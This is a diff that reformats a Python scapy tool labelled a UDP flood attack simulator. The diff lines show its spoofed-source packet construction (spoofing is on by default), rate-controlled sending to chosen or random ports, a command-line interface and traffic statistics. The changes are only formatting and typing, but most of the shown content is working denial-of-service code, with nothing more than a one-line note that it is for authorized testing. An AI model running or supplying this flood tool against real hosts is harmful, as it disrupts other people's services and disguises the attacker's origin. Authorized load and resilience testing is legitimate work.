@@ -34,14 +34,13 @@ License: Proprietary
 Version: 1.0.0
 """
 
-import os
-import sys
-import time
-import random
-import socket
 import argparse
 import ipaddress
-from typing import List, Dict, Optional, Any
+import os
+import random
+import sys
+import time
+from typing import Any
 
 # Add parent directory to path to import logger
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
@@ -50,22 +49,24 @@ try:
 except ImportError:
     # Fallback logging if the centralized logger is not available
     import logging
+
     def get_logger(name):
         logger = logging.getLogger(name)
         if not logger.handlers:
             handler = logging.StreamHandler()
-            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
             handler.setFormatter(formatter)
             logger.addHandler(handler)
             logger.setLevel(logging.INFO)
         return logger
+
 
 # Get logger for this module
 logger = get_logger(__name__)
 
 # Import scapy with error handling
 try:
-    from scapy.all import IP, UDP, Raw, RandIP, RandShort, send, conf
+    from scapy.all import IP, UDP, RandIP, RandShort, Raw, conf, send
 except ImportError:
     logger.error("This script requires the scapy library.")
     logger.error("Install it using: pip install scapy")
@@ -93,15 +94,17 @@ class UDPFloodAttack:
         verbose (bool): Whether to enable verbose output
     """
 
-    def __init__(self,
-                 target_ip: str,
-                 ports: List[int],
-                 packet_count: int = 1000,
-                 rate: int = 100,
-                 payload_size: int = 512,
-                 spoof_ip: bool = True,
-                 random_ports: bool = False,
-                 verbose: bool = False):
+    def __init__(
+        self,
+        target_ip: str,
+        ports: list[int],
+        packet_count: int = 1000,
+        rate: int = 100,
+        payload_size: int = 512,
+        spoof_ip: bool = True,
+        random_ports: bool = False,
+        verbose: bool = False,
+    ):
         """
         Initialize the UDP flood attack simulator.
 
@@ -161,12 +164,12 @@ class UDPFloodAttack:
         # Set scapy verbosity
         conf.verb = 1 if verbose else 0
 
-        logger.info(f"Initialized UDP flood attack simulation")
+        logger.info("Initialized UDP flood attack simulation")
         logger.info(f"Target: {target_ip}")
         if not random_ports:
             logger.info(f"Ports: {', '.join(map(str, self.ports))}")
         else:
-            logger.info(f"Ports: Random")
+            logger.info("Ports: Random")
         if self.verbose:
             logger.info(f"Packet count: {packet_count}, Rate: {rate} packets/second")
             logger.info(f"Payload size: {payload_size} bytes")
@@ -192,14 +195,16 @@ class UDPFloodAttack:
         ip_layer = IP(dst=self.target_ip, src=src_ip)
         udp_layer = UDP(
             sport=RandShort(),  # Random source port
-            dport=port          # Destination port
+            dport=port,  # Destination port
         )
 
         # Combine layers with payload
-        packet = ip_layer/udp_layer/Raw(load=payload)
+        packet = ip_layer / udp_layer / Raw(load=payload)
 
         if self.verbose:
-            logger.debug(f"Created UDP packet: {src_ip}:{packet[UDP].sport} -> {self.target_ip}:{port} ({self.payload_size} bytes)")
+            logger.debug(
+                f"Created UDP packet: {src_ip}:{packet[UDP].sport} -> {self.target_ip}:{port} ({self.payload_size} bytes)"
+            )
 
         return packet
 
@@ -228,7 +233,7 @@ class UDPFloodAttack:
             logger.error(f"Error sending UDP packet to port {port}: {str(e)}")
             return False
 
-    def execute(self) -> Dict[str, Any]:
+    def execute(self) -> dict[str, Any]:
         """
         Execute the UDP flood attack.
 
@@ -273,7 +278,7 @@ class UDPFloodAttack:
             self._print_summary(stats)
             return stats
 
-    def _get_statistics(self) -> Dict[str, Any]:
+    def _get_statistics(self) -> dict[str, Any]:
         """
         Get statistics about the attack execution.
 
@@ -300,10 +305,10 @@ class UDPFloodAttack:
             "actual_rate": actual_rate,
             "rate_efficiency": (actual_rate / self.rate * 100) if self.rate > 0 else 0,
             "payload_size_bytes": self.payload_size,
-            "estimated_traffic_bytes": total_traffic
+            "estimated_traffic_bytes": total_traffic,
         }
 
-    def _print_summary(self, stats: Dict[str, Any]) -> None:
+    def _print_summary(self, stats: dict[str, Any]) -> None:
         """
         Print a summary of the attack execution.
 
@@ -317,18 +322,18 @@ class UDPFloodAttack:
         if not self.random_ports:
             logger.info(f"Ports: {', '.join(map(str, stats['ports']))}")
         else:
-            logger.info(f"Ports: Random")
+            logger.info("Ports: Random")
         logger.info(f"Packets sent: {stats['packets_sent']}")
         logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
         logger.info(f"Configured rate: {stats['configured_rate']} packets/second")
         logger.info(f"Actual rate: {stats['actual_rate']:.2f} packets/second")
         logger.info(f"Rate efficiency: {stats['rate_efficiency']:.2f}%")
         logger.info(f"Payload size: {stats['payload_size_bytes']} bytes")
-        logger.info(f"Estimated traffic: {stats['estimated_traffic_bytes']/1024:.2f} KB")
+        logger.info(f"Estimated traffic: {stats['estimated_traffic_bytes'] / 1024:.2f} KB")
         logger.info("=" * 50)
 
 
-def parse_port_list(port_str: str) -> List[int]:
+def parse_port_list(port_str: str) -> list[int]:
     """
     Parse a comma-separated list of ports or port ranges.
 
@@ -341,18 +346,20 @@ def parse_port_list(port_str: str) -> List[int]:
     ports = []
 
     # Split by comma
-    parts = port_str.split(',')
+    parts = port_str.split(",")
 
     for part in parts:
         part = part.strip()
 
         # Check if it's a range
-        if '-' in part:
+        if "-" in part:
             try:
-                start, end = map(int, part.split('-', 1))
+                start, end = map(int, part.split("-", 1))
                 # Limit range size
                 if end - start > 1000:
-                    logger.warning(f"Port range {start}-{end} too large, limiting to {start}-{start+1000}")
+                    logger.warning(
+                        f"Port range {start}-{end} too large, limiting to {start}-{start + 1000}"
+                    )
                     end = start + 1000
                 ports.extend(range(start, end + 1))
             except ValueError:
@@ -384,38 +391,38 @@ def parse_arguments() -> argparse.Namespace:
     """
     parser = argparse.ArgumentParser(
         description="UDP Flood Attack Simulation Tool",
-        epilog="IMPORTANT: Use only for authorized security testing."
+        epilog="IMPORTANT: Use only for authorized security testing.",
     )
 
     # Required arguments
     parser.add_argument(
-        "-t", "--target",
-        dest="target_ip",
-        required=True,
-        help="IP address of the target"
+        "-t", "--target", dest="target_ip", required=True, help="IP address of the target"
     )
 
     parser.add_argument(
-        "-p", "--ports",
+        "-p",
+        "--ports",
         dest="ports",
-        help="Target ports (comma-separated, ranges allowed, e.g., '53,123,161' or '1000-2000')"
+        help="Target ports (comma-separated, ranges allowed, e.g., '53,123,161' or '1000-2000')",
     )
 
     # Optional arguments
     parser.add_argument(
-        "-c", "--count",
+        "-c",
+        "--count",
         dest="packet_count",
         type=int,
         default=1000,
-        help="Number of packets to send (default: 1000)"
+        help="Number of packets to send (default: 1000)",
     )
 
     parser.add_argument(
-        "-r", "--rate",
+        "-r",
+        "--rate",
         dest="rate",
         type=int,
         default=100,
-        help="Number of packets to send per second (default: 100)"
+        help="Number of packets to send per second (default: 100)",
     )
 
     parser.add_argument(
@@ -423,36 +430,31 @@ def parse_arguments() -> argparse.Namespace:
         dest="payload_size",
         type=int,
         default=512,
-        help="Size of packet payload in bytes (default: 512)"
+        help="Size of packet payload in bytes (default: 512)",
     )
 
     parser.add_argument(
-        "-s", "--spoof",
+        "-s",
+        "--spoof",
         dest="spoof_ip",
         action="store_true",
         default=True,
-        help="Use random source IPs (default: True)"
+        help="Use random source IPs (default: True)",
     )
 
     parser.add_argument(
-        "--no-spoof",
-        dest="spoof_ip",
-        action="store_false",
-        help="Don't use random source IPs"
+        "--no-spoof", dest="spoof_ip", action="store_false", help="Don't use random source IPs"
     )
 
     parser.add_argument(
         "--random-ports",
         dest="random_ports",
         action="store_true",
-        help="Use random destination ports instead of specific ports"
+        help="Use random destination ports instead of specific ports",
     )
 
     parser.add_argument(
-        "-v", "--verbose",
-        dest="verbose",
-        action="store_true",
-        help="Enable verbose output"
+        "-v", "--verbose", dest="verbose", action="store_true", help="Enable verbose output"
     )
 
     return parser.parse_args()
@@ -495,7 +497,7 @@ def main() -> None:
             payload_size=args.payload_size,
             spoof_ip=args.spoof_ip,
             random_ports=args.random_ports,
-            verbose=args.verbose
+            verbose=args.verbose,
         )
 
         # Execute the attack
